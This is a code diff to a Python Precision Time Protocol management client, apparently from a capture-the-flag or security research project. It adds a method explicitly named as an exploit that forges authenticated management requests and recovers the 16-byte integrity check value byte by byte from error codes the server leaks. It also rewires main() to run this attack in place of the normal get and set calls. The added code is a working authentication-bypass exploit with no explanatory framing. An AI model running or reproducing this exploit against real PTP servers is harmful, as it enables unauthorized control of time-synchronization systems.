@@ -105,10 +105,44 @@ class PtpManagement:
         self.send(message)
         response = self.receive()
 
+    def get_user_description_exploit(self):
+        icv = bytearray(16)
+
+        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
+        self.sequence_number = 0
+
+        payload = message.get_payload()
+        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
+        payload.management.target_port_id.port = 1
+        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
+        payload.management.starting_boundary_hops = 0
+        payload.management.boundary_hops = 0
+
+        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
+
+        self.add_auth_tlv(message)
+        request = bytearray(message.encode(self.BUFFER_SIZE))
+
+        for i in range(len(icv) + 1):
+            request[-len(icv):] = icv
+
+
+            self.socket.sendto(request, (self.SERVER_ADDRESS, self.SERVER_PORT_GENERAL))
+            response = self.receive()
+
+            if (response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
+                raise RuntimeError("Expected management message")
+
+            for tlv in response.get_tlvs():
+                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
+                    icv[i] = tlv.payload.management_error_status.error_id - 0xc000
+
 def main():
     with PtpManagement(42) as management:
-        management.set_user_description("test1234")
-        management.get_user_description()
+        #management.set_user_description("test1234")
+        #management.get_user_description()
+        management.get_user_description_exploit()
 
 if __name__ == "__main__":
     main()
